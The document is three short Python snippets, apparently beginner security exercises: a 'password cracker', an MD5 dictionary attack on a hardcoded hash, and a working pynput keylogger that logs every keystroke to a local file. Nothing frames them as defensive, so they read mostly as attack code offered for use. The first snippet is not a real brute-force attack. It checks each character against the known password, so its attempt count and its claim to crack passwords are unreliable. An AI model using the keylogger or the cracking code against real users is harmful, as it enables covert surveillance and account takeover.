1) passworrd cracker
import random

# Character set for brute-force attack
list_of_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

# Generate a random password
password = ""
for _ in range(random.randint(8, 16)):  # Realistic password length
    password += random.choice(list_of_chars)

def solve_password(word):
    attempted_password = ""
    attempts = 0  # Counter to count total attempts

    for character in word:
        for entry in list_of_chars:
            attempts += 1
            if character == entry:
                attempted_password += character
                break  # Move to the next character

    return attempted_password, attempts

# Crack the password
cracked_password, total_attempts = solve_password(password)

# Display results
print("Generated Password: ", password)
print("Cracked Password:   ", cracked_password)
print("Password Match: ", cracked_password == password)
print("Total Attempts: ", total_attempts)


2)password cracking dict
import hashlib

# Hashed password to crack (MD5 of 'password123')
target_hash = "482c811da5d5b4bc6d497ffa98491e38"

# Dictionary list (in memory)
wordlist = ["123456", "password", "letmein", "admin", "password123"]

found = False

for word in wordlist:
    hashed_word = hashlib.md5(word.encode()).hexdigest()
    
    if hashed_word == target_hash:
        print(f"[✔] Password found: {word}")
        found = True
        break

if not found:
    print("[✘] Password not found in the wordlist.")


3)keyloger
from pynput.keyboard import Listener

# Function to handle key presses
def on_press(key):
    try:
        # Check if the key is a regular character or a number
        if hasattr(key, 'char') and key.char is not None:
            with open("keylog.txt", "a") as log_file:
                log_file.write(key.char)
                print(key.char) 
        else:
            # Handle special keys
            with open("keylog.txt", "a") as log_file:
                log_file.write(f"[{key}]")  # Write special keys like enter, shift, etc.
    except Exception as e:
        print("Error:", e)

# Setting up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
    
